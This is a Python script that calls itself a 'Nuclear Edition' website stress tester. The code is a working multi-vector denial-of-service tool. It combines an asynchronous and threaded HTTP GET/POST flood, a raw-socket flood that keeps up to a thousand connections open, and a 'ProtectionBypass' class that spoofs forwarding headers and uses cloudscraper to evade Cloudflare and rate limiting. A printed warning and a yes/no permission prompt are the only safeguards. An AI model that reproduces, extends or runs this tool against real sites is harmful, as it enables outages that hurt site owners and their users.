#!/usr/bin/env python3
"""
ULTIMATE WEBSITE STRESS TESTER - NUCLEAR EDITION (V3)
Author: Anonymous
Description: Advanced multi-vector stress testing tool for website resilience testing
"""

import sys
import os
import time
import random
import socket
import ssl
import json
import argparse
import threading
import concurrent.futures
import asyncio
import aiohttp
import cloudscraper
import urllib3
import requests
import ipaddress
from fake_useragent import UserAgent
from urllib.parse import urlparse, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from multiprocessing import Manager, Pool, cpu_count
from collections import defaultdict, deque
from datetime import datetime
from hashlib import md5
from string import ascii_letters, digits
from typing import List, Dict, Tuple, Optional, Union

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========================
# GLOBAL CONFIGURATION
# ========================
VERSION = "3.0.0-Nuclear"
MAX_WORKERS = 500  # Maximum worker threads/processes
MAX_SOCKETS = 1000  # Maximum concurrent sockets
REQUEST_TIMEOUT = 15  # Seconds
DEFAULT_DURATION = 300  # 5 minutes
MAX_RETRIES = 3  # Max retries for failed requests
CONNECTION_LIMIT = 1000  # Max connections per host
KEEP_ALIVE = True  # HTTP keep-alive
DEBUG_MODE = False  # Debug output

# ========================
# ADVANCED PROTECTION BYPASS
# ========================
class ProtectionBypass:
    """
    Advanced techniques for bypassing security protections
    """
    
    @staticmethod
    def rotate_ip():
        """Generate random X-Forwarded-For IP"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def get_cf_headers():
        """Generate Cloudflare bypass headers"""
        return {
            'CF-Connecting-IP': ProtectionBypass.rotate_ip(),
            'X-Forwarded-For': ProtectionBypass.rotate_ip(),
            'X-Real-IP': ProtectionBypass.rotate_ip(),
        }
    
    @staticmethod
    def get_anti_ddos_headers():
        """Generate anti-DDoS headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive' if KEEP_ALIVE else 'close',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'TE': 'Trailers',
        }

# ========================
# USER AGENT MANAGEMENT
# ========================
class UserAgentManager:
    """
    Realistic user agent generation and management
    """
    
    DESKTOP_AGENTS = [
        # Chrome
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        
        # Firefox
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.4; rv:89.0) Gecko/20100101 Firefox/89.0',
        
        # Safari
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        
        # Edge
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    ]
    
    MOBILE_AGENTS = [
        # iOS
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        
        # Android
        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    ]
    
    @classmethod
    def get_random_agent(cls, mobile_prob=0.3):
        """Get random user agent with mobile probability"""
        if random.random() < mobile_prob:
            return random.choice(cls.MOBILE_AGENTS)
        return random.choice(cls.DESKTOP_AGENTS)
    
    @classmethod
    def get_all_agents(cls):
        """Get all available user agents"""
        return cls.DESKTOP_AGENTS + cls.MOBILE_AGENTS

# ========================
# REQUEST PAYLOAD GENERATOR
# ========================
class PayloadGenerator:
    """
    Generate realistic request payloads
    """
    
    @staticmethod
    def generate_get_params():
        """Generate random GET parameters"""
        params = {
            'id': random.randint(1000, 9999),
            'ref': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
            'cache': random.choice(['true', 'false', '1', '0']),
            'lang': random.choice(['en', 'es', 'fr', 'de', 'it']),
            'time': str(int(time.time())),
        }
        return params
    
    @staticmethod
    def generate_post_data():
        """Generate random POST data"""
        data = {
            'username': ''.join(random.choices(ascii_letters + digits, k=8)),
            'email': f"{''.join(random.choices(ascii_letters, k=8))}@example.com",
            'password': ''.join(random.choices(ascii_letters + digits + '!@#$%^&*', k=12)),
            'csrf_token': ''.join(random.choices('abcdef0123456789', k=32)),
            'remember': random.choice(['1', '0', 'true', 'false']),
        }
        return data
    
    @staticmethod
    def generate_json_payload():
        """Generate random JSON payload"""
        return {
            'action': random.choice(['login', 'register', 'search', 'view']),
            'data': {
                'id': random.randint(1, 1000),
                'timestamp': int(time.time()),
                'items': [random.randint(1, 100) for _ in range(random.randint(1, 5))],
            },
            'meta': {
                'source': random.choice(['web', 'mobile', 'api']),
                'version': f"{random.randint(1, 5)}.{random.randint(0, 9)}",
            }
        }

# ========================
# HTTP FLOOD ATTACK
# ========================
class HTTPFlood:
    """
    Advanced HTTP flood attack with multiple techniques
    """
    
    def __init__(self, target_url: str, workers: int = MAX_WORKERS):
        self.target_url = target_url
        self.workers = workers
        self.scrapers = [self._create_scraper() for _ in range(workers)]
        self.session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=CONNECTION_LIMIT, force_close=not KEEP_ALIVE),
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            headers=self._get_base_headers()
        )
        self.manager = Manager()
        self.stats = self.manager.dict({
            'total': 0,
            'success': 0,
            'errors': 0,
            'start_time': time.time(),
            'last_request': 0,
        })
        self.request_queue = deque()
    
    def _create_scraper(self):
        """Create cloudscraper instance with random settings"""
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': random.choice([True, False]),
            },
            delay=random.uniform(0.1, 0.5),
        )
        return scraper
    
    def _get_base_headers(self):
        """Generate base headers for requests"""
        headers = {
            **ProtectionBypass.get_cf_headers(),
            **ProtectionBypass.get_anti_ddos_headers(),
            'User-Agent': UserAgentManager.get_random_agent(),
            'Referer': self._get_random_referer(),
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7']),
        }
        return headers
    
    def _get_random_referer(self):
        """Generate random referer URL"""
        domains = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.facebook.com/',
            'https://www.twitter.com/',
            'https://www.reddit.com/',
            'https://www.linkedin.com/',
        ]
        paths = ['', 'search?q=test', 'users/profile', 'posts/123', 'images/cat.jpg']
        return random.choice(domains) + random.choice(paths)
    
    async def _send_async_request(self, session, method='GET'):
        """Send async HTTP request with random parameters"""
        try:
            headers = self._get_base_headers()
            
            if method == 'GET':
                params = PayloadGenerator.generate_get_params()
                async with session.get(self.target_url, params=params, headers=headers) as response:
                    return response.status
            else:
                data = PayloadGenerator.generate_post_data()
                async with session.post(self.target_url, json=data, headers=headers) as response:
                    return response.status
        except Exception as e:
            return str(e)
    
    def _send_sync_request(self, scraper, method='GET'):
        """Send synchronous HTTP request with cloudscraper"""
        try:
            headers = self._get_base_headers()
            
            if method == 'GET':
                params = PayloadGenerator.generate_get_params()
                response = scraper.get(self.target_url, params=params, headers=headers)
            else:
                data = PayloadGenerator.generate_post_data()
                response = scraper.post(self.target_url, json=data, headers=headers)
            
            return response.status_code
        except Exception as e:
            return str(e)
    
    async def run_async_flood(self, duration: int):
        """Run async HTTP flood attack"""
        start_time = time.time()
        tasks = []
        
        while time.time() - start_time < duration:
            method = random.choice(['GET', 'POST'])
            task = asyncio.create_task(self._send_async_request(self.session, method))
            tasks.append(task)
            
            if len(tasks) >= self.workers * 2:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for task in done:
                    result = task.result()
                    self._update_stats(result)
                tasks = list(pending)
        
        # Wait for remaining tasks
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                self._update_stats(result)
        
        await self.session.close()
    
    def run_sync_flood(self, duration: int):
        """Run synchronous HTTP flood attack with threading"""
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = []
            
            while time.time() - start_time < duration:
                method = random.choice(['GET', 'POST'])
                scraper = random.choice(self.scrapers)
                futures.append(executor.submit(self._send_sync_request, scraper, method))
                
                if len(futures) >= self.workers * 2:
                    for future in concurrent.futures.as_completed(futures):
                        result = future.result()
                        self._update_stats(result)
                    futures = []
            
            # Process remaining futures
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                self._update_stats(result)
    
    def _update_stats(self, result):
        """Update statistics based on request result"""
        self.stats['total'] += 1
        self.stats['last_request'] = time.time()
        
        if isinstance(result, int) and result < 400:
            self.stats['success'] += 1
        else:
            self.stats['errors'] += 1
    
    def get_stats(self):
        """Get current attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        stats = dict(self.stats)
        stats['rps'] = stats['total'] / elapsed if elapsed > 0 else 0
        stats['elapsed'] = elapsed
        return stats

# ========================
# RAW SOCKET FLOOD ATTACK
# ========================
class RawSocketFlood:
    """
    Low-level socket flood for bandwidth saturation
    """
    
    def __init__(self, target_host: str, target_port: int = 80, ssl_port: int = 443):
        self.target_host = target_host
        self.target_port = target_port
        self.ssl_port = ssl_port
        self.sockets = []
        self.running = False
        self.manager = Manager()
        self.stats = self.manager.dict({
            'total': 0,
            'success': 0,
            'errors': 0,
            'start_time': time.time(),
        })
    
    def _create_socket(self, use_ssl=False):
        """Create and connect a new socket"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            port = self.ssl_port if use_ssl else self.target_port
            s.connect((self.target_host, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.options |= ssl.OP_NO_SSLv2
                context.options |= ssl.OP_NO_SSLv3
                context.options |= ssl.OP_NO_TLSv1
                context.options |= ssl.OP_NO_TLSv1_1
                s = context.wrap_socket(s, server_hostname=self.target_host)
            
            return s
        except Exception as e:
            if DEBUG_MODE:
                print(f"Socket error: {e}")
            return None
    
    def _generate_http_request(self):
        """Generate HTTP request with random headers"""
        method = random.choice(['GET', 'POST', 'HEAD'])
        path = '/' + ''.join(random.choices(ascii_letters + digits, k=random.randint(5, 15)))
        
        headers = [
            f"Host: {self.target_host}",
            f"User-Agent: {UserAgentManager.get_random_agent()}",
            f"Accept: {random.choice(['*/*', 'text/html', 'application/json'])}",
            f"Accept-Language: {random.choice(['en-US', 'en-GB', 'fr-FR'])}",
            f"Accept-Encoding: {random.choice(['gzip, deflate', 'br', 'identity'])}",
            f"Connection: {'keep-alive' if KEEP_ALIVE else 'close'}",
            f"Cache-Control: {random.choice(['no-cache', 'max-age=0'])}",
            f"X-Forwarded-For: {ProtectionBypass.rotate_ip()}",
        ]
        
        if method == 'POST':
            headers.append(f"Content-Length: {random.randint(100, 1000)}")
            headers.append("Content-Type: application/x-www-form-urlencoded")
        
        request = f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        
        if method == 'POST':
            request += f"data={quote(''.join(random.choices(ascii_letters + digits, k=random.randint(50, 500))))}"
        
        return request.encode()
    
    def _socket_worker(self, worker_id, use_ssl=False):
        """Worker thread for socket flood"""
        while self.running:
            try:
                s = self._create_socket(use_ssl)
                if not s:
                    time.sleep(0.1)
                    continue
                
                request = self._generate_http_request()
                s.sendall(request)
                
                # Keep connection alive for a while
                start_time = time.time()
                while self.running and time.time() - start_time < random.uniform(1, 5):
                    try:
                        s.sendall(b"X-Ping: " + str(time.time()).encode() + b"\r\n\r\n")
                        time.sleep(random.uniform(0.1, 0.5))
                    except:
                        break
                
                self.stats['success'] += 1
            except Exception as e:
                if DEBUG_MODE:
                    print(f"Worker {worker_id} error: {e}")
                self.stats['errors'] += 1
            finally:
                try:
                    if 's' in locals():
                        s.close()
                except:
                    pass
                
                self.stats['total'] += 1
    
    def start(self, workers=100, use_ssl=True):
        """Start socket flood attack"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        for i in range(workers):
            t = threading.Thread(target=self._socket_worker, args=(i, use_ssl))
            t.daemon = True
            t.start()
    
    def stop(self):
        """Stop socket flood attack"""
        self.running = False
    
    def get_stats(self):
        """Get current attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        stats = dict(self.stats)
        stats['rps'] = stats['total'] / elapsed if elapsed > 0 else 0
        stats['elapsed'] = elapsed
        return stats

# ========================
# MAIN ATTACK CONTROLLER
# ========================
class NuclearAttack:
    """
    Main controller for coordinating multiple attack vectors
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        parsed = urlparse(target_url)
        self.target_host = parsed.netloc
        self.scheme = parsed.scheme
        self.port = 443 if self.scheme == 'https' else 80
        
        # Initialize attack modules
        self.http_flood = HTTPFlood(target_url)
        self.socket_flood = RawSocketFlood(self.target_host, self.port, self.port)
        
        # Statistics
        self.start_time = time.time()
        self.attack_threads = []
        self.running = False
    
    def start(self, duration: int = DEFAULT_DURATION, http_workers: int = MAX_WORKERS, socket_workers: int = MAX_SOCKETS):
        """Start all attack vectors"""
        if self.running:
            print("Attack already running!")
            return
        
        self.running = True
        self.start_time = time.time()
        
        print(f"\n[!] Starting NUCLEAR ATTACK on {self.target_url}")
        print(f"[!] Duration: {duration} seconds")
        print(f"[!] HTTP Workers: {http_workers}")
        print(f"[!] Socket Workers: {socket_workers}")
        print("[!] Attack vectors:")
        print("    - Advanced HTTP Flood (GET/POST mix)")
        print("    - Raw Socket Flood (Bandwidth saturation)")
        print("    - Cloudflare bypass techniques")
        print("    - Rate limit evasion")
        print("    - Realistic traffic mimicking\n")
        
        # Start HTTP flood in separate thread
        http_thread = threading.Thread(target=self._run_http_flood, args=(duration, http_workers))
        http_thread.daemon = True
        http_thread.start()
        self.attack_threads.append(http_thread)
        
        # Start socket flood
        self.socket_flood.start(socket_workers, self.scheme == 'https')
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self._stats_monitor, args=(duration,))
        stats_thread.daemon = True
        stats_thread.start()
        self.attack_threads.append(stats_thread)
        
        # Wait for duration
        time.sleep(duration)
        self.stop()
    
    def _run_http_flood(self, duration: int, workers: int):
        """Run HTTP flood for specified duration"""
        if sys.version_info >= (3, 7):
            asyncio.run(self.http_flood.run_async_flood(duration))
        else:
            self.http_flood.run_sync_flood(duration)
    
    def _stats_monitor(self, duration: int):
        """Monitor and display attack statistics"""
        last_print = 0
        
        while self.running and time.time() - self.start_time < duration:
            time.sleep(1)
            
            if time.time() - last_print >= 5:
                self.print_stats()
                last_print = time.time()
    
    def print_stats(self):
        """Print current attack statistics"""
        http_stats = self.http_flood.get_stats()
        socket_stats = self.socket_flood.get_stats()
        elapsed = time.time() - self.start_time
        
        print("\n" + "="*80)
        print(f"NUCLEAR ATTACK STATS - {datetime.now().strftime('%H:%M:%S')}")
        print(f"Elapsed: {elapsed:.1f}s")
        print("-"*80)
        print("HTTP FLOOD:")
        print(f"  Requests: {http_stats['total']} ({http_stats['rps']:.1f}/s)")
        print(f"  Success: {http_stats['success']} | Errors: {http_stats['errors']}")
        print("-"*80)
        print("SOCKET FLOOD:")
        print(f"  Connections: {socket_stats['total']} ({socket_stats['rps']:.1f}/s)")
        print(f"  Success: {socket_stats['success']} | Errors: {socket_stats['errors']}")
        print("="*80 + "\n")
    
    def stop(self):
        """Stop all attack vectors"""
        if not self.running:
            return
        
        self.running = False
        self.socket_flood.stop()
        
        elapsed = time.time() - self.start_time
        print(f"\n[!] Attack completed in {elapsed:.1f} seconds")
        self.print_stats()

# ========================
# COMMAND LINE INTERFACE
# ========================
def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description=f"Nuclear Website Stress Tester v{VERSION}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument('url', help="Target URL to test")
    parser.add_argument('-d', '--duration', type=int, default=DEFAULT_DURATION,
                       help="Attack duration in seconds")
    parser.add_argument('-w', '--workers', type=int, default=MAX_WORKERS,
                       help="Number of HTTP worker threads")
    parser.add_argument('-s', '--sockets', type=int, default=MAX_SOCKETS,
                       help="Number of raw socket workers")
    parser.add_argument('--no-http', action='store_true',
                       help="Disable HTTP flood attack")
    parser.add_argument('--no-sockets', action='store_true',
                       help="Disable raw socket flood")
    parser.add_argument('--debug', action='store_true',
                       help="Enable debug output")
    
    return parser.parse_args()

def validate_url(url):
    """Validate target URL"""
    try:
        result = urlparse(url)
        if not all([result.scheme, result.netloc]):
            raise ValueError
        return True
    except:
        return False

def main():
    """Main entry point"""
    args = parse_args()
    
    if not validate_url(args.url):
        print("Error: Invalid URL format. Please include http:// or https://")
        return
    
    global DEBUG_MODE
    DEBUG_MODE = args.debug
    
    print("\n" + "="*80)
    print(f"NUCLEAR WEBSITE STRESS TESTER v{VERSION}")
    print("="*80)
    print("WARNING: THIS IS AN ADVANCED STRESS TESTING TOOL")
    print("ONLY USE ON WEBSITES YOU OWN WITH EXPLICIT PERMISSION")
    print("MISUSE MAY VIOLATE LAWS AND TERMS OF SERVICE")
    print("="*80 + "\n")
    
    confirm = input("Do you have legal permission to test this website? (yes/no): ").lower()
    if confirm != 'yes':
        print("Test cancelled.")
        return
    
    # Start attack
    attack = NuclearAttack(args.url)
    
    try:
        attack.start(
            duration=args.duration,
            http_workers=args.workers,
            socket_workers=args.sockets
        )
    except KeyboardInterrupt:
        print("\n[!] Received keyboard interrupt, stopping attack...")
        attack.stop()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        attack.stop()

if __name__ == "__main__":
    main()
